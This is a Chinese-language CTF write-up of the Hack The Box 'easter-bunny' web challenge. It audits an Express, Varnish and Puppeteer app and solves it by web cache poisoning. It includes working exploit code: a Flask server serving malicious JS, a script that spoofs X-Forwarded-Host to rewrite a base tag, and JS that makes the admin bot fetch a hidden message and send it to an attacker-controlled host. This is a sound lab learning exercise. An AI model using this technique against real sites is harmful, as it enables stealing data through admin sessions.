---
title: "Hack the Box——easter-bunny wp"
date: 2023-02-02T19:10:07+08:00
showDate: true
draft: false
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---

## 0x00 开始

很久没有刷ctf了，刷刷题练练手，来一道HTB简单题
一眼就相中了这道五星好评的简单题
![1.png](1.png)

## 0x01 部署环境

下载环境，部署到本地方便跑，部署完之后访问，好可爱的界面
![2.png](2.png)
但是它再可爱也与我们无关，我们要透过现象看本质，随便操作一下，看看有哪些http请求
![3.png](3.png)

总结一下
静态资源有
```
/
/static/main.js
/static/viewletter.js
/letters?id=
```
api有
```
POST /submit 
Body {"message": ""}
return {"message": id}

GET /message/:id
return {"message" id, "count": count}
其中id=3的时候返回401，其它都是200或404
```
那flag应该就藏在这个3里头了。

## 0x02 审计源码

知道flag在哪，但是无法访问也没用呀，这个时候没什么还头绪，测了一下`/submit`和`/message/:id`两个api都没啥问题。那问题到底在哪里呢，没办法，本菜鸡只能去读给的源码了（这里htb给的files不知道是为了方便测试还是说也是题目的一部分，因为有些题不看files里的源码也能做出来就是难度比较大，本菜鸡就只能看源码做题了。）

通过审计源码可以发现几个可疑的地方

### 可能的利用


这里有模板渲染，会把得到的cdn的值渲染到html，express[官方文档](https://expressjs.com/en/api.html#req.hostname)里说如果`trust proxy`不等于false的话，req.hostname是可以通过`X-Forwarded-Host`获取，那就意味着我们可以伪造req.hostname来让这个页面触发xss之类的漏洞吧

但是经过测试，模板引擎过滤了`"`和`<>`，xss应该是别想了。

```
router.get("/letters", (req, res) => {
    return res.render("viewletters.html", {
        cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`,
    });
});

vierletters.html
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <base href="{{cdn}}" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
    <link href="https://fonts.googleapis.com/css2?family=Caveat&amp;family=Secular+One&amp;display=swap" rel="stylesheet" />
    <link href="main.css" rel="stylesheet" />
    <title>Write to the Easter Bunny!</title>
  </head>

index.js
app.set('trust proxy', process.env.PROXY !== 'false');
```

![4.png](4.png)

### 可疑的puppeteer

这里的visit是调用puppeteer来通过本地访问指定url，显然id=3就是被hidden了然后需要通过puppeteer来访问。

```js
router.js
router.post("/submit", async (req, res) => {
    const { message } = req.body;
    if (message) {
        return db.insertMessage(message)
            .then(async inserted => {
                try {
                    botVisiting = true;
                    await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
                    ...

router.get("/message/:id", async (req, res) => {
    try {
        const { id } = req.params;
        const message = await db.getMessage(id);
        ...
        if (message.hidden && !isAdmin(req))
            return res.status(401).send({
                error: "Sorry, this letter has been hidden by the easter bunny's helpers!",
                count: count
            });
            ...
auth.js
const authSecret = require('crypto').randomBytes(69).toString('hex');
const isAdmin = (req, res) => {
  return req.ip === '127.0.0.1' && req.cookies['auth'] === authSecret;
};
```

### 可疑的varnish

项目里用了[varnish](https://varnish-cache.org)，一个缓存服务，那多半这道题跟缓存有关了。

翻一下项目里varnish的配置文件，按照[官方文档](https://varnish-cache.org/docs/6.0/reference/vcl.html)，可以知道服务是以req.url和req.http.host为缓存的键来进行缓存。 

```vcl
vcl 4.1;

...

sub vcl_hash {
    hash_data(req.url);

    if (req.http.host) {
        hash_data(req.http.host);
    } else {
        hash_data(server.ip);
    }

    return (lookup);
}
...


```

## 0x03 思路

那么怎么才能让它替我们访问`/message/3`这个api并且把返回值告诉我们呢，首先先要把项目的流程捋清楚。

### message流程
首先通过`POST /submit`创建message返回msg_id，后端会通过puppeteer访问`/letter?id=`访问新创建的message

![5.png](5.png)

### 缓存流程
然后就是缓存服务的流程，根据给出的配置文件，varnish会以请求的`url`和`hostname`为键，从后端拿到的内容为值做缓存，也就是从同一个host访问同一个`url`会有缓存。

![6.png](6.png)

其中这里的hostname指的是headers里的host字段，这个也是可以通过修改请求头伪造的。


### base标签
那么这里该怎么利用呢，还记得前面有个模板渲染
```
router.get("/letters", (req, res) => {
    return res.render("viewletters.html", {
        cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`,
    });
});

vierletters.html
    ...
    <base href="{{cdn}}" />
    ...
```

这里的`req.hostname`可以通过`X-Forwarded-Host`实现可控的，但是过滤了xss。上[mdn](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/base)上看了一base标签的用法，意思是这个url可以控制html内相对路径href或者src的根url，如

![7.png](7.png)

把上面的服务串起来可以通过缓存投毒来控制puppeteer访问的html资源，然后把想要的资源传给我们的恶意服务。

## 0x04 缓存投毒

### 编写恶意服务

因为base改成了我们自己的服务，然后puppeteer访问的时候，因为base标签已经被我们修改为自己的服务了，所以会来我们的服务找js等静态资源。

那就相当于我们可以控制整个静态资源

```python
app = Flask(__name__)

# 允许跨域，不允许跨域的话是没办法像我们的服务fetch的
CORS(app)

# 访问静态资源
@app.route("/static/<file>")
def get_file(file):
    return open(file, "r").read()
```

### 构造恶意js
受害客户端会来我们的服务请求js文件，这时候我们只要让修改js，让他先去`http://127.0.0.1/message/3`，然后再发给我们就行

```js
const get_msg = () => {
    fetch("http://127.0.0.1/message/3")
    .then(response => response.json())
    .then(data => {
      msg = data.message;
      loadLetter(); // 发送message到我们的服务
    })
}

const loadLetter = () => {
  ...
  fetch(`/message/${msg}`)
  ...
  }

get_msg();
```

### 触发投毒

现在还需要差一个触发器，生成恶意静态缓存，然后让puppeteer去访问。

```python

# 恶意服务地址
my_vps = "my.vps.com"

# 获取当前id
def get_current_id():
    url = f"{base_url}/message/{random.randint(1000, 10000)}"
    r = requests.get(url)
    return r.json().get("count")

# 生成恶意缓存
def make_cache(id_):
    url = f"{base_url}/letters?id={id_}"
    headers = {
        "host": "127.0.0.1",
        "X-Forwarded-Host": my_vps
    }
    r = requests.get(url, headers=headers)
    if re.search(headers.get("X-Forwarded-Host"), r.text):
        print(f"[*] make {id_} cache success")


# 触发缓存
def hack():
    current_id = get_current_id()
    next_id = current_id + 1
    print(f"next_id: {next_id}")
    make_cache(next_id)
    print("[*] start")
    url = f"{base_url}/submit"
    data = {
        "message": "1"
    }
    requests.post(url, json=data)

# 写成服务方便调用
@app.route("/start")
def start():
    hack()
    return ""
```

## 0x05 hacker

这个时候只要把服务开启来，然后访问http://my.vps.com/start，就可以生成恶意缓存然后让puppeteer中毒。

成功拿下！

![8.png](8.png)

## 0x06 总结


通过这道题学到了一波缓存投毒有关的东西，感觉如果缓存没控制好，危害还是很大的，可以实现大规模的污染。这道题如果不看给出的源码应该也能做，纯黑盒测的话，如果是没有遇到过相应攻击的人，难度应该很大，本菜鸡只配白盒审计。

## 0x07 参考链接
[实战Web缓存投毒（上）](https://www.anquanke.com/post/id/156356)

[实战Web缓存投毒（下）](https://www.anquanke.com/post/id/156551)

[Puppeteer](https://github.com/puppeteer/puppeteer)

[\<base>：文档根 URL 元素](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/base)

[express 4.x API](https://expressjs.com/en/api.html)

[对缓存投毒的学习总结](https://xz.aliyun.com/t/7696)